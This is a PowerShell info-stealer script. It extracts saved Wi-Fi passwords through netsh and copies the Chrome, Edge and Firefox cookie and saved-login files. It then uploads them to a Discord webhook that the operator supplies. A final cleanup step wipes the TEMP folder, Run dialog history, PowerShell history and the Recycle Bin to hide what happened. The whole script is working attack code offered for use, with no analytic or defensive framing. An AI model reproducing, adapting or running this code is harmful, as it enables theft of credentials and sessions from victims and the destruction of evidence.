############################################################################################################################################################
# Step 1: Function to Upload to Discord Webhook

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text
    )

    $hookurl = "insert your discord webhook"

    $Body = @{
        'username' = $env:username
        'content'  = $text
    }

    # Upload a file if exists
    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
    
    # Send a message if exists
    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }
}

############################################################################################################################################################
# Step 2: Function to Extract Wi-Fi Credentials

function Dump-Wifi {
    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
    $wifiFilePath = "$env:TEMP/--wifi-pass.txt"
    $wifiProfiles > $wifiFilePath
    return $wifiFilePath
}

############################################################################################################################################################
# Step 3: Function to Extract Cookies and Stored Passwords

function Get-BrowserData {
    param (
        [string]$browserName
    )

    $user = [System.Environment]::UserName
    $browserData = @()
    $cookies = ""

    switch ($browserName) {
        "Chrome" {
            $chromeCookiesPath = "C:\Users\$user\AppData\Local\Google\Chrome\User Data\Default\Cookies"
            $chromePasswordPath = "C:\Users\$user\AppData\Local\Google\Chrome\User Data\Default\Login Data"
            
            # Check if cookies exist
            if (Test-Path $chromeCookiesPath) {
                Write-Host "[+] Found Chrome cookies file"
                $cookies = Get-Content -Path $chromeCookiesPath -Raw
                $browserData += "Chrome Cookies: $cookies"
            } else {
                Write-Host "[-] Chrome cookies file not found"
            }

            # Check if passwords exist
            if (Test-Path $chromePasswordPath) {
                Write-Host "[+] Found Chrome password file"
                $passwords = Get-Content -Path $chromePasswordPath -Raw
                $browserData += "Chrome Passwords: $passwords"
            } else {
                Write-Host "[-] Chrome password file not found"
            }
        }

        "Edge" {
            $edgeCookiesPath = "C:\Users\$user\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
            $edgePasswordPath = "C:\Users\$user\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"

            # Check if cookies exist
            if (Test-Path $edgeCookiesPath) {
                Write-Host "[+] Found Edge cookies file"
                $cookies = Get-Content -Path $edgeCookiesPath -Raw
                $browserData += "Edge Cookies: $cookies"
            } else {
                Write-Host "[-] Edge cookies file not found"
            }

            # Check if passwords exist
            if (Test-Path $edgePasswordPath) {
                Write-Host "[+] Found Edge password file"
                $passwords = Get-Content -Path $edgePasswordPath -Raw
                $browserData += "Edge Passwords: $passwords"
            } else {
                Write-Host "[-] Edge password file not found"
            }
        }

        "Firefox" {
            $firefoxCookiesPath = "C:\Users\$user\AppData\Roaming\Mozilla\Firefox\Profiles\*\cookies.sqlite"
            $firefoxPasswordPath = "C:\Users\$user\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json"

            # Check if cookies exist
            if (Test-Path $firefoxCookiesPath) {
                Write-Host "[+] Found Firefox cookies file"
                $cookies = Get-Content -Path $firefoxCookiesPath -Raw
                $browserData += "Firefox Cookies: $cookies"
            } else {
                Write-Host "[-] Firefox cookies file not found"
            }

            # Check if passwords exist
            if (Test-Path $firefoxPasswordPath) {
                Write-Host "[+] Found Firefox password file"
                $passwords = Get-Content -Path $firefoxPasswordPath -Raw
                $browserData += "Firefox Passwords: $passwords"
            } else {
                Write-Host "[-] Firefox password file not found"
            }
        }

        default {
            Write-Host "[-] Unsupported browser"
        }
    }

    return $browserData
}

############################################################################################################################################################
# Step 4: Dump Cookies and Passwords, Then Upload Data to Discord

$browserData = @()

# Extract from Chrome
$browserData += Get-BrowserData -browserName "Chrome"

# Extract from Edge
$browserData += Get-BrowserData -browserName "Edge"

# Extract from Firefox
$browserData += Get-BrowserData -browserName "Firefox"

# Store browser data in a file
$browserDataFilePath = "$env:TEMP/browser-data.txt"
$browserData -join "`n" | Out-File -FilePath $browserDataFilePath -Force

# Upload the Wi-Fi credentials and browser data files to Discord
$wifiFile = Dump-Wifi
Upload-Discord -file $wifiFile

if (Test-Path $browserDataFilePath) {
    Upload-Discord -file $browserDataFilePath
}

############################################################################################################################################################
# Step 5: Clean Up Function

function Clean-Exfil {
    # Empty temp folder
    Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

    # Delete run box history
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

    # Delete PowerShell history
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Empty recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

############################################################################################################################################################
# Step 6: Final Cleanup and Exit

# Perform clean-up actions
Clean-Exfil

# Exit PowerShell
Exit
